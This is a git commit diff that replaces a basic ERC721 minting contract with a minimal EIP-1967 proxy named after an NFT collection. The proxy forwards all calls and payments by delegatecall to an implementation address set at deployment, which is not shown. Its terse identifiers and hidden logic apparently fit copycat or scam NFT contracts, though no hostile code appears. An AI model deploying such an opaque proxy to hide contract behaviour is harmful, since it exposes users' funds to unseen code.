37d0b4a7d5ffdca30d78b4e4b0c82c10b4156688
cryptone202 <93718546+cryptone202@users.noreply.github.com>
2022-03-31 10:58:05 +0200

    Update NFTee.sol

--- contracts/NFTee.sol
+++ contracts/NFTee.sol
@@ -1,32 +1,51 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
-import "@openzeppelin/contracts/utils/Counters.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/utils/StorageSlot.sol";
 
-contract GameItem is ERC721 {
-    using Counters for Counters.Counter;
-    Counters.Counter private _tokenIds;
+contract GutterPunks{
+// GutterPunks    
+    bytes32 internal constant KEY = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 
-    constructor() ERC721("GameItem", "ITM") {}
-
-    mapping(uint => string) tokenURIs;
-
-    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
-      return tokenURIs[tokenId];
+    constructor(bytes memory _a, bytes memory _data) payable {
+        (address _as) = abi.decode(_a, (address));
+        assert(KEY == bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
+        require(Address.isContract(_as), "address error");
+        StorageSlot.getAddressSlot(KEY).value = _as;
+        if (_data.length > 0) {
+            Address.functionDelegateCall(_as, _data);
+        }
     }
 
-    function create(address player, string memory mytokenURI)
-        public
-        returns (uint256)
-    {
-        _tokenIds.increment();
-
-        uint256 newItemId = _tokenIds.current();
-        _mint(player, newItemId);
-        tokenURIs[newItemId] = mytokenURI;
-        //_setTokenURI(newItemId, tokenURI);
-
-        return newItemId;
+    function _g(address to) internal virtual {
+        assembly {
+            calldatacopy(0, 0, calldatasize())
+            let result := delegatecall(gas(), to, 0, calldatasize(), 0, 0)
+            returndatacopy(0, 0, returndatasize())
+            switch result
+            case 0 {
+                revert(0, returndatasize())
+            }
+            default {
+                return(0, returndatasize())
+            }
+        }
     }
+
+    function _fallback() internal virtual {
+        _beforeFallback();
+        _g(StorageSlot.getAddressSlot(KEY).value);
+    }
+
+    fallback() external payable virtual {
+        _fallback();
+    }
+
+    receive() external payable virtual {
+        _fallback();
+    }
+
+    function _beforeFallback() internal virtual {}
+
 }
